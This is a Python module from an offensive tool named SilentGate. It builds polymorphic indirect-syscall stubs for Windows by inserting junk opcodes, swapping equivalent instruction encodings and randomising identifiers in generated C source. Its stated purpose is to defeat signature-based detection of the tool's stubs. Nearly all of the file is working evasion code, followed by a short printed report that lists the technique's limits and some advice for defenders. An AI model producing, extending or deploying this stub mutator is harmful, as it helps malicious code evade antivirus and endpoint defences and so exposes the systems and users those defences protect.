"""
SilentGate - core/poly_mutator.py
v3.0 Feature: Polymorphic Stub Mutation

Author  : JarDani
License : MIT
Purpose : Mutates generated stubs so every execution produces
          functionally identical but bytewise different output.
          Defeats signature-based detection of SilentGate stubs.

Three mutation techniques:
  A - Junk code insertion between real instructions
  B - Equivalent instruction substitution
  C - Random function and variable name generation

MITRE ATT&CK: T1027.002 - Obfuscated Files: Software Packing
"""

import os
import random
import string
import hashlib


# ── JUNK INSTRUCTION SETS ────────────────────────────────────────────────────

# These instructions do nothing useful but change the byte pattern
# Each is a list of bytes
JUNK_INSTRUCTIONS = [
    [0x90],                          # nop
    [0x50, 0x58],                    # push rax / pop rax
    [0x51, 0x59],                    # push rcx / pop rcx
    [0x52, 0x5A],                    # push rdx / pop rdx
    [0x53, 0x5B],                    # push rbx / pop rbx
    [0x90, 0x90],                    # nop nop
    [0x90, 0x90, 0x90],              # nop nop nop
    [0x48, 0x87, 0xC0],              # xchg rax, rax (nop equivalent)
    [0x48, 0x31, 0xC0, 0x48, 0x09, 0xC0],  # xor rax,rax / or rax,rax
]

# ── EQUIVALENT INSTRUCTION SETS ──────────────────────────────────────────────

# mov eax, SSN can be replaced with these equivalents
# Each entry is a function that takes SSN and returns bytes
def equiv_mov_eax_direct(ssn):
    """B8 xx xx xx xx - direct mov eax, imm32"""
    return [0xB8] + list(ssn.to_bytes(4, 'little'))

def equiv_mov_eax_xor_add(ssn):
    """xor eax, eax / add eax, SSN"""
    return [
        0x31, 0xC0,                           # xor eax, eax
        0x05] + list(ssn.to_bytes(4, 'little') # add eax, SSN
    )

def equiv_mov_eax_push_pop(ssn):
    """push SSN / pop rax (only works for small SSN values)"""
    if ssn <= 0x7F:
        return [0x6A, ssn, 0x58]              # push imm8 / pop rax
    return equiv_mov_eax_direct(ssn)           # fallback

def equiv_mov_eax_sub(ssn):
    """mov eax, 0xFFFFFFFF / sub eax, (0xFFFFFFFF - SSN)"""
    complement = (0xFFFFFFFF - ssn) & 0xFFFFFFFF
    return (
        [0xB8, 0xFF, 0xFF, 0xFF, 0xFF] +      # mov eax, 0xFFFFFFFF
        [0x2D] + list(complement.to_bytes(4, 'little'))  # sub eax, complement
    )

EQUIV_MOV_EAX = [
    equiv_mov_eax_direct,
    equiv_mov_eax_xor_add,
    equiv_mov_eax_push_pop,
    equiv_mov_eax_sub,
]

# ── RANDOM NAME GENERATOR ────────────────────────────────────────────────────

def random_name(prefix="", length=8):
    """
    Generate a random alphanumeric name.
    Used for polymorphic function and variable names.
    """
    chars = string.ascii_lowercase + string.digits
    suffix = ''.join(random.choices(chars, k=length))
    return f"{prefix}{suffix}" if prefix else suffix


def random_names_for_api(api_name):
    """
    Generate a complete set of random names for one API stub.
    Returns dict of original_name -> random_name mappings.
    """
    seed = hashlib.md5((api_name + str(random.random())).encode()).hexdigest()[:8]
    return {
        f"SG_{api_name}":          f"fn_{seed}_exec",
        f"SG_Init_{api_name}":     f"fn_{seed}_init",
        f"{api_name}_addr":        f"addr_{seed}",
        "gadget_addr":             f"gaddr_{seed}",
        "stub_mem":                f"mem_{seed}",
        "ssn":                     f"sn_{seed}",
    }

# ── STUB MUTATOR ─────────────────────────────────────────────────────────────

def mutate_stub_bytes(ssn, gadget_placeholder=0xDEADBEEFCAFEBABE, explain=False):
    """
    Generate a polymorphic indirect syscall stub.

    Base stub structure:
      mov r10, rcx    (always first - Windows ABI requirement)
      mov eax, SSN    (mutated - different bytes each time)
      mov r11, gadget (always needed - load gadget address)
      jmp r11         (always last - indirect jump)

    Junk instructions inserted randomly between real ones.

    Returns bytearray of the mutated stub.
    """
    stub = bytearray()

    if explain:
        print(f"\n  [POLY MUTATOR] Generating polymorphic stub for SSN {ssn}...")

    # ── BLOCK 1: mov r10, rcx ───────────────────────────────────────────────
    # This is fixed - Windows x64 ABI requires it first
    # But we can add junk BEFORE it

    # Random junk before
    num_junk = random.randint(0, 3)
    for _ in range(num_junk):
        junk = random.choice(JUNK_INSTRUCTIONS)
        stub.extend(junk)
        if explain:
            print(f"  [POLY MUTATOR] Inserted junk: {bytes(junk).hex()}")

    # Real instruction: mov r10, rcx (4C 8B D1)
    stub.extend([0x4C, 0x8B, 0xD1])
    if explain:
        print(f"  [POLY MUTATOR] mov r10, rcx : 4C 8B D1")

    # ── BLOCK 2: mov eax, SSN ───────────────────────────────────────────────
    # This is mutated - pick random equivalent instruction

    # Random junk between blocks
    num_junk = random.randint(0, 2)
    for _ in range(num_junk):
        junk = random.choice(JUNK_INSTRUCTIONS)
        stub.extend(junk)

    # Pick random equivalent for mov eax, SSN
    equiv_func = random.choice(EQUIV_MOV_EAX)
    equiv_bytes = equiv_func(ssn)
    stub.extend(equiv_bytes)
    if explain:
        print(f"  [POLY MUTATOR] mov eax, {ssn} : {bytes(equiv_bytes).hex()} ({equiv_func.__name__})")

    # ── BLOCK 3: mov r11, gadget ─────────────────────────────────────────────
    # Fixed - needed to load the gadget address into r11
    # 49 BB + 8 bytes address

    # Random junk between blocks
    num_junk = random.randint(0, 2)
    for _ in range(num_junk):
        junk = random.choice(JUNK_INSTRUCTIONS)
        stub.extend(junk)

    # mov r11, imm64 (49 BB + 8 byte address)
    stub.extend([0x49, 0xBB])
    stub.extend(gadget_placeholder.to_bytes(8, 'little'))
    if explain:
        print(f"  [POLY MUTATOR] mov r11, gadget : 49 BB {gadget_placeholder:016X}")

    # ── BLOCK 4: jmp r11 ────────────────────────────────────────────────────
    # Fixed - indirect jump to gadget
    stub.extend([0x41, 0xFF, 0xE3])
    if explain:
        print(f"  [POLY MUTATOR] jmp r11 : 41 FF E3")

    if explain:
        print(f"  [POLY MUTATOR] Total stub size : {len(stub)} bytes")
        print(f"  [POLY MUTATOR] Stub bytes      : {stub.hex()}")

    return bytes(stub)


def mutate_c_source(c_source, api_name, explain=False):
    """
    Apply random name substitution to generated C source code.
    Every variable and function name becomes random.
    No two generated files share the same names.
    """
    name_map = random_names_for_api(api_name)

    if explain:
        print(f"\n  [POLY MUTATOR] Applying name mutation to C source...")
        for orig, rand in name_map.items():
            print(f"  [POLY MUTATOR] {orig:40s} -> {rand}")

    mutated = c_source
    for orig, rand in name_map.items():
        mutated = mutated.replace(orig, rand)

    return mutated, name_map


def generate_polymorphic_stubs(api_name, ssn, count=3, explain=False):
    """
    Generate multiple unique mutations of the same stub.
    Demonstrates that each run produces different bytes.
    """
    if explain:
        print(f"\n  [POLY MUTATOR] Generating {count} unique mutations for {api_name} SSN={ssn}")

    stubs    = []
    seen     = set()

    for i in range(count):
        stub = mutate_stub_bytes(ssn, explain=(explain and i == 0))
        hex_repr = stub.hex()

        if hex_repr in seen:
            # Collision - regenerate
            stub     = mutate_stub_bytes(ssn)
            hex_repr = stub.hex()

        seen.add(hex_repr)
        stubs.append(stub)

        if explain:
            print(f"  [POLY MUTATOR] Mutation {i+1}: {hex_repr[:40]}... ({len(stub)} bytes)")

    # Verify all are unique
    unique = len(set(s.hex() for s in stubs))
    if explain:
        print(f"  [POLY MUTATOR] Unique mutations: {unique}/{count}")
        if unique == count:
            print(f"  [POLY MUTATOR] All mutations are bytewise unique")

    return stubs


def print_poly_report(api_name, ssn, stubs):
    """Print a formatted polymorphic mutation report."""
    unique = len(set(s.hex() for s in stubs))
    sizes  = [len(s) for s in stubs]

    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  POLYMORPHIC MUTATION REPORT                                 ║
  ╚══════════════════════════════════════════════════════════════╝

  API            : {api_name}
  SSN            : {ssn}
  Mutations      : {len(stubs)}
  Unique         : {unique}/{len(stubs)}
  Size range     : {min(sizes)} - {max(sizes)} bytes
  MITRE          : T1027.002 - Software Packing

  Sample mutations:""")

    for i, stub in enumerate(stubs):
        print(f"    [{i+1}] {stub.hex()[:48]}...")

    print(f"""
  What this defeats:
  Signature scanners that recognise SilentGate stub patterns.
  Each mutation is functionally identical but bytewise unique.
  No two runs produce the same stub bytes.
  The tool itself has no detectable signature.

  What this does NOT defeat:
  Behavioural analysis of what the stub does.
  Emulation-based detection that runs the stub.
  Entropy analysis of the overall binary.

  Defender perspective:
  Focus on behavioural detection not byte signatures.
  Emulate suspicious memory regions before execution.
  Monitor for the syscall instruction pattern regardless
  of surrounding junk instructions.
""")